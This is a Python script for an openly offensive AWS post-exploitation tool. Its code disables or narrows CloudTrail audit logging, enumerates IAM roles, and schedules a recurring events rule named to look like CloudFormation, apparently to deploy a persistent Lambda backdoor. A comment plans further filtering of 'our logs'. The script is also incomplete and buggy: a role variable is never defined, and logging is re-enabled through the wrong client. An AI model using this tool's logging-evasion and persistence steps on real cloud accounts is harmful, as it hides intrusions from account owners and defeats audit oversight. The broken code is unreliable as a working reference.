# TODO: Add CloudWatch Events to filter out our logs

#!/usr/bin/env python

import sys
import boto3
import readline
import botocore
import argparse
import zipfile
import io

parser = argparse.ArgumentParser(description='Long-Evans AWS Remote Access Tool', epilog='Github: https://github.com/cxxr/long-evans')
parser.add_argument('--region', default='us-west-2', help='Which region to set the default client to. Default: us-west-2')
parser.add_argument('--disable-logging', default=False, action='store_true', help='Disables CloudTrail logging')
parser.add_argument('--re-enable-logging', default=True, action='store_true', help='Re-enables CloudTrail logging after disabling')
parser.add_argument('--lambda-region', help='Which region to put the lambda function into. Default: random unused')
parser.add_argument('--source', required=True, help='Which python file to use as the lambda')
parser.add_argument('--runtime', default='python2.7', help='Python runtime to use, either python2.7 or python3.6')
parser.add_argument('--handler', default='lambda_handler', help='Which function in the Python file to call in AWS Lambda')

args = parser.parse_args()

region = args.region

# Try and disable CloudTrail
multiregionDisableSuccessful = False
cloudTrailRegions = set()
if args.disable_logging:
    client = boto3.client('cloudtrail', region_name=region)
    trails = client.describe_trails(includeShadowTrails=True)
    for trail in trails['trailList']:
        arn = trail['TrailARN']
        trailRegion = trail['HomeRegion']
        print trail
        client = boto3.client('cloudtrail', region_name=trailRegion)
        try:
            print "client.update_trail: {}".format(client.update_trail(Name=arn, IsMultiRegionTrail=False, IncludeGlobalServiceEvents=False))
            multiregionDisableSuccessful = True
            cloudTrailRegions.add(trailRegion)
        except botocore.exceptions.ClientError as e:
            if e.response['Error']['Code'] == 'InternalFailure':
                print "client.stop_logging: {}".format(client.stop_logging(Name=arn))
            else:
                print "Got unexpected response: {}".format(e.response)

# Find IAM role appropriate, or create our own
client = boto3.client('iam', region_name=region)


# Get all roles
listed_roles = client.list_roles()
roles = listed_roles['Roles']
isTruncated = listed_roles['IsTruncated']
while isTruncated:
    listed_roles = client.list_roles(Marker=listed_roles['Marker'])
    roles = roles + listed_roles['Roles']
    isTruncated = listed_roles['IsTruncated']


client = boto3.client('events', region_name=region)

client.put_rule(Name='CloudFormation-Rule', ScheduleExpression='rate(10 minutes)', State='ENABLED', RoleArn=rolearn)

zipbytes = io.BytesIO()
with zipfile.ZipFile(zipbytes, 'w') as zf:
    zf.write(args.source)

zipbytes.seek(0)
with open('output.zip','w') as f:
    f.write(zipbytes.read())

# Re-enable CloudTrail if we disabled it
if args.disable_logging and args.re_enable_logging:
    print "client.start_logging: {}".format(client.start_logging(Name=arn))

